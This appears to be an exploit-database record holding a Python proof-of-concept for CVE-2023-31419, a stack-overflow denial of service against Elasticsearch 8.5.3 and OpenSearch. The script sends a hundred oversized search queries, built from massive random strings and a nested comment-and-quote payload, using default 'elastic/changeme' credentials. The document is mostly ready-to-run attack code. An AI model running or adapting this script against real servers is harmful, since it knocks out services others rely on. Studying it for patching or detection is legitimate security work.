[
  {
    "source": "## https://sploitus.com/exploit?id=EDB-ID:51787\n# Exploit Author: TOUHAMI KASBAOUI\r\n# Vendor Homepage: https://elastic.co/\r\n# Version: 8.5.3 / OpenSearch\r\n# Tested on: Ubuntu 20.04 LTS\r\n# CVE : CVE-2023-31419\r\n# Ref: https://github.com/sqrtZeroKnowledge/Elasticsearch-Exploit-CVE-2023-31419\r\n\r\nimport requests\r\nimport random\r\nimport string\r\n\r\nes_url = 'http://localhost:9200'  # Replace with your Elasticsearch server URL\r\nindex_name = '*'\r\n\r\npayload = \"/*\" * 10000 + \"\\\\\" +\"'\" * 999\r\n\r\nverify_ssl = False\r\n\r\nusername = 'elastic'\r\npassword = 'changeme'\r\n\r\nauth = (username, password)\r\n\r\nnum_queries = 100\r\n\r\nfor _ in range(num_queries):\r\n    symbols = ''.join(random.choice(string.ascii_letters + string.digits + '^') for _ in range(5000))\r\n    search_query = {\r\n        \"query\": {\r\n            \"match\": {\r\n                \"message\": (symbols * 9000) + payload\r\n            }\r\n        }\r\n    }\r\n\r\n    print(f\"Query {_ + 1} - Search Query:\")\r\n\r\n    search_endpoint = f'{es_url}/{index_name}/_search'\r\n    response = requests.get(search_endpoint, json=search_query, verify=verify_ssl, auth=auth)\r\n\r\n    if response.status_code == 200:\r\n        search_results = response.json()\r\n\r\n        print(f\"Query {_ + 1} - Response:\")\r\n        print(search_results)\r\n\r\n        total_hits = search_results['hits']['total']['value']\r\n        print(f\"Query {_ + 1}: Total hits: {total_hits}\")\r\n\r\n        for hit in search_results['hits']['hits']:\r\n            source_data = hit['_source']\r\n            print(\"Payload result: {search_results}\")\r\n    else:\r\n        print(f\"Error for query {_ + 1}: {response.status_code} - {response.text}\")",
    "id": "EDB-ID:51787",
    "href": "https://www.exploit-db.com/raw/51787",
    "title": "Exploit for Elasticsearch - StackOverflow DoS"
  }
]
